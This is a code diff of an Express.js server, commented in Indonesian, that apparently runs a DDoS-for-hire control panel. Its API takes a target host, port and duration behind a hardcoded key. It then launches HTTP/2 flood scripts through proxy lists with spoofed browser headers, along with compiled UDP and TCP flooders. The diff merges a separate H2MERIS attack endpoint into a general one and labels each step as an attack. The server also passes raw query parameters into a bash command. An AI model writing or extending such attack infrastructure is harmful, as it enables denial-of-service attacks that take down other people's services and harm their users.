@@ -17,6 +17,7 @@ const methods = {
 
 const activeProcesses = new Map();
 
+// Fungsi untuk menghasilkan perintah berdasarkan metode serangan
 const generateCommand = (method, host, port, time) => {
     switch (method) {
         case 'H2FLASH':
@@ -36,7 +37,7 @@ const generateCommand = (method, host, port, time) => {
         case 'H2BYPASS':
             return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 8 proxy.txt`;
         case 'H2MERIS':
-            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 ${port} proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
+            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'UDP':
             return `cd /root/.trash && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
         case 'TCP':
@@ -46,6 +47,7 @@ const generateCommand = (method, host, port, time) => {
     }
 };
 
+// Endpoint umum untuk memulai serangan dengan berbagai metode
 app.get('/api', (req, res) => {
     const key = req.query.key;
     const host = req.query.host;
@@ -53,16 +55,24 @@ app.get('/api', (req, res) => {
     const time = req.query.time;
     const method = req.query.method;
 
+    // Validasi key
     if (key !== 'leance') {
         return res.status(401).json({ error: 'Invalid key' });
     }
 
+    // Validasi metode
     if (!methods[method]) {
         return res.status(400).json({ error: 'Unknown method' });
     }
 
+    // Validasi parameter host, port, dan time
+    if (!host || !port || !time) {
+        return res.status(400).json({ error: 'Missing host, port, or time parameter' });
+    }
+
+    // Menjalankan serangan berdasarkan metode yang dipilih
     res.json({
-        status: 'Attack initiated',
+        status: `${method} attack initiated`,
         host: host,
         port: port,
         time: time,
@@ -73,60 +83,21 @@ app.get('/api', (req, res) => {
     const process = spawn('bash', ['-c', command], { detached: true });
 
     process.stdout.on('data', (data) => {
-        console.log(`Stdout: ${data}`);
+        console.log(`${method} Stdout: ${data}`);
     });
 
     process.stderr.on('data', (data) => {
-        console.error(`Stderr: ${data}`);
+        console.error(`${method} Stderr: ${data}`);
     });
 
     process.on('close', (code) => {
-        console.log(`Process exited with code ${code}`);
+        console.log(`${method} Process exited with code ${code}`);
     });
 
     activeProcesses.set(process.pid, process);
 });
 
-// Endpoint khusus untuk H2MERIS dengan host, port, dan time
-app.get('/api/h2meris', (req, res) => {
-    const key = req.query.key;
-    const host = req.query.host;
-    const port = req.query.port;
-    const time = req.query.time;
-
-    if (key !== 'leance') {
-        return res.status(401).json({ error: 'Invalid key' });
-    }
-
-    if (!host || !port || !time) {
-        return res.status(400).json({ error: 'Missing host, port, or time parameter' });
-    }
-
-    res.json({
-        status: 'H2MERIS attack initiated',
-        host: host,
-        port: port,
-        time: time
-    });
-
-    const command = generateCommand('H2MERIS', host, port, time);
-    const process = spawn('bash', ['-c', command], { detached: true });
-
-    process.stdout.on('data', (data) => {
-        console.log(`H2MERIS Stdout: ${data}`);
-    });
-
-    process.stderr.on('data', (data) => {
-        console.error(`H2MERIS Stderr: ${data}`);
-    });
-
-    process.on('close', (code) => {
-        console.log(`H2MERIS Process exited with code ${code}`);
-    });
-
-    activeProcesses.set(process.pid, process);
-});
-
+// Endpoint untuk menghentikan semua serangan yang sedang berjalan
 app.get('/api/stop', (req, res) => {
     const key = req.query.key;
 
@@ -142,6 +113,7 @@ app.get('/api/stop', (req, res) => {
     res.json({ status: 'All attacks stopped.' });
 });
 
+// Menjalankan server pada port yang ditentukan
 app.listen(port, () => {
     console.log(`Server running at http://localhost:${port}`);
 });
